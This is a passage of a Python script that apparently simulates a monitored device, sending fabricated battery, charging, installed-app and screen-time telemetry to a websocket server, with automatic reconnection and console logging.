            payload["installed_apps"]    = installed_apps
            last_sent_installed_apps     = installed_apps

        if last_sent_charging != charging:
            payload["charging"]          = charging
            last_sent_charging           = charging

        if last_sent_battery != battery:
            payload["battery"]           = battery
            last_sent_battery            = battery

        local_event_type = None
        # Hourly screen-time update (or first tick)
        hour_key = f"{now.tm_year}-{now.tm_mon}-{now.tm_mday}-{now.tm_hour}"
        if (now.tm_min == 0 and last_hour_reported != hour_key) or not last_hour_reported:
            last_hour_reported = hour_key
            if screen_time_minutes == 0:
                screen_time_minutes += random.randint(10, 30)
            payload["screen_time_minutes"] = screen_time_minutes
            local_event_type = "hourly_screen_time_update"

        payload_json = json.dumps(payload)
        safe_print(f"[>] TX: {payload_json}")
        await ws.send(payload_json)

        if local_event_type == "hourly_screen_time_update":
            safe_print(
                f"    [↑] HOURLY SCREEN TIME: {screen_time_minutes // 60}h {screen_time_minutes % 60}m"
            )
        else:
            safe_print(
                f"    [↑] TICK | Batt: {battery}%  Charging: {'Y' if charging else 'N'}"
                f"  GPS: {'ON' if location_tracking else 'OFF'}"
                f"  Screen: {screen_time_minutes}m"
                f"  Audio: {'🔊 PLAYING' if audio_playing else 'idle'}"
            )

        await asyncio.sleep(max(1, ping_interval))  # never spin faster than 1s


# ══════════════════════════════════════════════════════════════════════════════
# Main connection loop  (auto-reconnects on failure)
# ══════════════════════════════════════════════════════════════════════════════

async def run_simulator() -> None:
    safe_print(f"\n[i] Device ID : {DEVICE_ID}")
    safe_print(f"[i] Server    : {BASE_URL}")
    safe_print(f"[i] Apps      : {installed_apps}\n")

    global last_sent_installed_apps, last_sent_battery, last_sent_charging

    while True:
        try:
            # websockets 10+ uses websockets.connect(); older uses websockets.connect as ctx mgr
            try:
                from websockets.legacy.client import connect
            except ImportError:
                from websockets import connect

            async with connect(BASE_URL) as ws:
                safe_print(f"[+] CONNECTED to {BASE_URL}")

                # Reset delta-tracking so first tick sends full state
                last_sent_installed_apps = None
                last_sent_battery        = None
                last_sent_charging       = None

                recv_task   = asyncio.create_task(receiver(ws))
                cmd_task    = asyncio.create_task(manual_command_sender(ws))
                send_task   = asyncio.create_task(sender_loop(ws))

                done, pending = await asyncio.wait(
                    [recv_task, cmd_task, send_task],
                    return_when=asyncio.FIRST_COMPLETED,
                )
                for task in pending:
                    task.cancel()
                    with suppress(asyncio.CancelledError):
                        await task

        except Exception as e:
            safe_print(f"[-] Connection dropped ({e}) — retrying in 5s…")
            await asyncio.sleep(5)


if __name__ == "__main__":
    try:
        asyncio.run(run_simulator())
    except KeyboardInterrupt:
        print("\n[i] Simulator stopped.")